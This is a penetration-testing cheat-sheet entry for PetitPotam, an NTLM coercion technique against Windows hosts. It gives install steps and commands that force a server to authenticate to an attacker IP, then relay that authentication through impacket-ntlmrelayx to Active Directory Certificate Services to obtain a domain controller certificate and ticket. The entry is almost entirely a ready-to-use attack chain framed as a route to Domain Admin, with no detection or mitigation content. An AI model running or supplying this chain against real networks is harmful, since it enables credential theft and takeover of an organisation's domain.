# 04.06 PetitPotam

> Force Windows servers to authenticate to attacker via MS-EFSRPC protocol — classic NTLM relay primitive.

## Overview

PetitPotam abuses the MS-EFSRPC remote procedure call protocol (Encrypting File System remote). Any unauthenticated caller (sometimes; or any authenticated user) can force a target Windows host to attempt SMB authentication to an attacker-controlled UNC path — leaking the target's machine account NetNTLM hash. Combine with ntlmrelayx to relay to ADCS (ESC8) for Domain Admin in one shot.

## Steps

- **Step 1** - Verify target Windows host exposes MS-EFSRPC (usually port 445 + named pipe).
- **Step 2** - Start ntlmrelayx pointing at relay target (ADCS HTTP).
- **Step 3** - Trigger PetitPotam against vulnerable Windows host.
- **Step 4** - Captured ticket lets you auth as <TARGET>$.

## Commands

### Install

```bash
git clone https://github.com/topotam/PetitPotam
cd PetitPotam
```

### Anonymous (unpatched)

```bash
python3 PetitPotam.py <ATTACKER-IP> <VULN-TARGET>
```

### Authenticated

```bash
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER-IP> <VULN-TARGET>
```

### Full chain — relay to ADCS

```bash
# Terminal 1 — relay
impacket-ntlmrelayx -t http://<CA-FQDN>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# Terminal 2 — coerce
python3 PetitPotam.py <ATTACKER-IP> <DC>
# ntlmrelayx receives DC$ auth → requests cert from ADCS for DC$
# Use cert to get DC$ TGT via Rubeus or PKINIT
```
